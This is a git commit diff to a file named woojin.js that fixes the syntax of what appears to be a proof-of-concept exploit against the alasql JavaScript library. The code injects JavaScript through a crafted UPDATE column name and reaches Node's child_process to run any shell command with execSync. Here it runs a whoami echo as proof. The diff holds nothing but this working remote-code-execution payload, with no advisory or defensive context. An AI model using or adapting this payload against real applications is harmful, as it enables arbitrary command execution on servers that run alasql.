baf1dfaa89c98f8b787fab1772c557a9fa7ebb05
vr2 <hydw9898@gmail.com>
2024-11-15 15:30:40 +0900

    Update woojin.js

--- woojin.js
+++ woojin.js
@@ -1,11 +1,11 @@
-const genPayload = command => 
+const genPayload = command => `
 new Function(
     'return this.process.mainModule.require'
 )()('child_process').execSync(${JSON.stringify(command)})
-;
+`;
 
 
 alasql('CREATE table i_am_a_table;' +
     `INSERT INTO i_am_a_table VALUES (1337);` +
-    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;` 
+    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;`
 );
